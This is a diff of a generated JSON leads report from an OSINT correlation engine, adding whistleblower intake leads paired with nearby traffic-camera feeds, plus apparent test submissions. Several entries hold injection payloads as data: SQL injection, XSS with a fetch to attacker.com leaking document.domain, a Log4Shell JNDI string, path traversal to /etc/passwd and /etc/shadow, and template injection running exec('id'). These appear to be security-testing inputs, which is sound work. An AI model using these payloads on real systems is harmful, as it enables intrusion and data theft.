@@ -1,6 +1,6 @@
 {
-  "generated_at": "2026-09-10T20:36:29.554873+00:00",
-  "generated_at_utc": "2026-09-10T20:37:56.555690+00:00",
+  "generated_at": "2026-09-10T22:37:40.016998+00:00",
+  "generated_at_utc": "2026-09-10T22:39:26.153657+00:00",
   "repo_root": "C:\\OsintNeoAi",
   "engine": "auto_leads_correlation_v2",
   "version": "1.0-cloud-auto",
@@ -12,10 +12,10 @@
     "address_clusters_count": 247,
     "high_risk_ppp_count": 0,
     "litigation_persons_count": 0,
-    "mutual_aid_leads_count": 502,
+    "mutual_aid_leads_count": 651,
     "csv_datasets_scanned": 79,
-    "total_leads_generated": 533,
-    "elapsed": 87.0
+    "total_leads_generated": 682,
+    "elapsed": 106.14
   },
   "graph_stats": {
     "nodes": 17488,
@@ -249,10 +249,10 @@
       "person_name": "Shu Chin Tseng",
       "org_count": 4,
       "org_sample": [
-        "BELAVITA LLC",
         "BELINGER LLC",
         "BELLALANCE LLC",
-        "MESAVILLE HOLDINGS LLC"
+        "MESAVILLE HOLDINGS LLC",
+        "BELAVITA LLC"
       ],
       "evidence": "Controls 4 orgs via OFFICER_OF/DIRECTOR_OF"
     },
@@ -15712,6 +15712,4930 @@
       "vector": "MUTUAL_AID_LEAD",
       "severity": "HIGH",
       "case_id": "CASE-0502",
+      "entity_name": "WHISTLEBLOWER 099",
+      "address": "1099 EAST BALL ROAD SUITE 9, ANAHEIM, CA",
+      "apn": "178-431-99",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #99 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0503",
+      "entity_name": "WHISTLEBLOWER WITNESS A",
+      "address": "ANAHEIM, CA",
+      "apn": null,
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Disclosure | Evidence of $1.5M COVID relief diversion to Chamber of Commerce."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0504",
+      "entity_name": "ANONYMOUS",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: General Inquiry | "
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0505",
+      "entity_name": "ANONYMOUS",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: General Inquiry | "
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0506",
+      "entity_name": "LARGE PAYLOAD TEST",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Stress Test | AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0507",
+      "entity_name": "; DROP TABLE CASES;",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Security Audit | '; DROP TABLE cases; --"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0508",
+      "entity_name": "<SCRIPT>ALERT XSS < SCRIPT>",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Security Audit | <script>alert('XSS')</script>"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0509",
+      "entity_name": "{{7*7}}",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Security Audit | {{7*7}}"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0510",
+      "entity_name": "${JNDI:LDAP: EVIL COM A}",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Security Audit | ${jndi:ldap://evil.com/a}"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0511",
+      "entity_name": "ETC PASSWD",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Security Audit | ../../../../etc/passwd"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0512",
+      "entity_name": "🚨 WHISTLEBLOWER 🕵️‍♂️ ‮REVERSED‬",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: International Corruption | Multi-lingual evidence: 日本語, العربية, 中文, Русский."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0513",
+      "entity_name": "CONCURRENT USER 0",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 0"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0514",
+      "entity_name": "CONCURRENT USER 1",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 1"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0515",
+      "entity_name": "CONCURRENT USER 2",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 2"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0516",
+      "entity_name": "CONCURRENT USER 3",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 3"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0517",
+      "entity_name": "CONCURRENT USER 4",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 4"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0518",
+      "entity_name": "CONCURRENT USER 5",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 5"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0519",
+      "entity_name": "CONCURRENT USER 6",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 6"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0520",
+      "entity_name": "CONCURRENT USER 7",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 7"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0521",
+      "entity_name": "CONCURRENT USER 8",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 8"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0522",
+      "entity_name": "CONCURRENT USER 9",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 9"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0523",
+      "entity_name": "CONCURRENT USER 10",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 10"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0524",
+      "entity_name": "CONCURRENT USER 11",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 11"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0525",
+      "entity_name": "CONCURRENT USER 12",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 12"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0526",
+      "entity_name": "CONCURRENT USER 13",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 13"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0527",
+      "entity_name": "CONCURRENT USER 14",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 14"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0528",
+      "entity_name": "CONCURRENT USER 15",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 15"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0529",
+      "entity_name": "CONCURRENT USER 16",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 16"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0530",
+      "entity_name": "CONCURRENT USER 17",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 17"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0531",
+      "entity_name": "CONCURRENT USER 18",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 18"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0532",
+      "entity_name": "CONCURRENT USER 19",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 19"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0533",
+      "entity_name": "CONCURRENT USER 20",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 20"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0534",
+      "entity_name": "CONCURRENT USER 21",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 21"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0535",
+      "entity_name": "CONCURRENT USER 22",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 22"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0536",
+      "entity_name": "CONCURRENT USER 23",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 23"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0537",
+      "entity_name": "CONCURRENT USER 24",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 24"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0538",
+      "entity_name": "CONCURRENT USER 25",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 25"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0539",
+      "entity_name": "CONCURRENT USER 26",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 26"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0540",
+      "entity_name": "CONCURRENT USER 27",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 27"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0541",
+      "entity_name": "CONCURRENT USER 28",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 28"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0542",
+      "entity_name": "CONCURRENT USER 29",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 29"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0543",
+      "entity_name": "; DROP TABLE LEADS; DROP TABLE USERS;",
+      "address": "'; DROP TABLE LEADS; DROP TABLE USERS; --",
+      "apn": "DROPTABLELEADSDROPTABLEUSERS",
+      "proximity_cctv": [],
+      "evidence": "Intake submission: '; DROP TABLE leads; DROP TABLE users; -- | '; DROP TABLE leads; DROP TABLE users; --"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0544",
+      "entity_name": "1 OR 1 = 1 UNION SELECT USERNAME PASSWORD FROM USERS",
+      "address": "1' OR '1'='1' UNION SELECT USERNAME, PASSWORD FROM USERS --",
+      "apn": "1OR11UNIONSELECTUSERNAMEPASSWORDFROMUSERS",
+      "proximity_cctv": [],
+      "evidence": "Intake submission: 1' OR '1'='1' UNION SELECT username, password FROM users -- | 1' OR '1'='1' UNION SELECT username, password FROM users --"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0545",
+      "entity_name": "<SCRIPT>ALERT DOCUMENT COOKIE < SCRIPT>",
+      "address": "<SCRIPT>ALERT(DOCUMENT COOKIE)</SCRIPT>",
+      "apn": "SCRIPTALERTDOCUMENTCOOKIESCRIPT",
+      "proximity_cctv": [],
+      "evidence": "Intake submission: <script>alert(document.cookie)</script> | <script>alert(document.cookie)</script>"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0546",
+      "entity_name": "<IMG SRC=X ONERROR= FETCH HTTP: ATTACKER COM?LEAK= +DOCUMENT DOMAIN >",
+      "address": "<IMG SRC=X ONERROR=\"FETCH('HTTP://ATTACKER COM?LEAK='+DOCUMENT DOMAIN)\">",
+      "apn": "IMGSRCXONERRORFETCHHTTPATTACKERCOMLEAKDOCUMENTDOMAIN",
+      "proximity_cctv": [],
+      "evidence": "Intake submission: <img src=x onerror=\"fetch('http://attacker.com?leak='+document.domain)\"> | <img src=x onerror=\"fetch('http://attacker.com?leak='+document.domain)\">"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0547",
+      "entity_name": "$ CAT ETC SHADOW",
+      "address": "$(CAT /ETC/SHADOW)",
+      "apn": "CATETCSHADOW",
+      "proximity_cctv": [],
+      "evidence": "Intake submission: $(cat /etc/shadow) | $(cat /etc/shadow)"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0548",
+      "entity_name": "| CALC EXE PING N 5 127 0 0 1",
+      "address": "| CALC EXE & PING -NORTH 5 127 0 0 1",
+      "apn": "CALCEXEPINGN5127001",
+      "proximity_cctv": [],
+      "evidence": "Intake submission: | calc.exe & ping -n 5 127.0.0.1 | | calc.exe & ping -n 5 127.0.0.1"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0549",
+      "entity_name": "WINDOWS SYSTEM32 CMD EXE",
+      "address": "/ / / / / /WINDOWS/SYSTEM32/CMD EXE",
+      "apn": "WINDOWSSYSTEM32CMDEXE",
+      "proximity_cctv": [],
+      "evidence": "Intake submission: ../../../../../../windows/system32/cmd.exe | ../../../../../../windows/system32/cmd.exe"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0550",
+      "entity_name": "{{7*7}} ${T JAVA LANG RUNTIME GETRUNTIME EXEC ID }",
+      "address": "{{7*7}} ${T(JAVA LANG RUNTIME) GETRUNTIME() EXEC('ID')}",
+      "apn": "77TJAVALANGRUNTIMEGETRUNTIMEEXECID",
+      "proximity_cctv": [],
+      "evidence": "Intake submission: {{7*7}} ${T(java.lang.Runtime).getRuntime().exec('id')} | {{7*7}} ${T(java.lang.Runtime).getRuntime().exec('id')}"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0551",
+      "entity_name": "\u0000\u0000\u0000\u0000",
+      "address": "\u0000\u0000\u0000\u0000",
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: \u0000\u0000\u0000\u0000 | \u0000\u0000\u0000\u0000"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0552",
+      "entity_name": "WHISTLEBLOWER 000",
+      "address": "1000 EAST BALL ROAD SUITE 0, ANAHEIM, CA",
+      "apn": "178-431-00",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #0 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0553",
+      "entity_name": "WHISTLEBLOWER 001",
+      "address": "1001 EAST BALL ROAD SUITE 1, ANAHEIM, CA",
+      "apn": "178-431-01",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #1 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0554",
+      "entity_name": "WHISTLEBLOWER 002",
+      "address": "1002 EAST BALL ROAD SUITE 2, ANAHEIM, CA",
+      "apn": "178-431-02",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #2 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0555",
+      "entity_name": "WHISTLEBLOWER 003",
+      "address": "1003 EAST BALL ROAD SUITE 3, ANAHEIM, CA",
+      "apn": "178-431-03",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #3 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0556",
+      "entity_name": "WHISTLEBLOWER 004",
+      "address": "1004 EAST BALL ROAD SUITE 4, ANAHEIM, CA",
+      "apn": "178-431-04",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #4 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0557",
+      "entity_name": "WHISTLEBLOWER 005",
+      "address": "1005 EAST BALL ROAD SUITE 5, ANAHEIM, CA",
+      "apn": "178-431-05",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
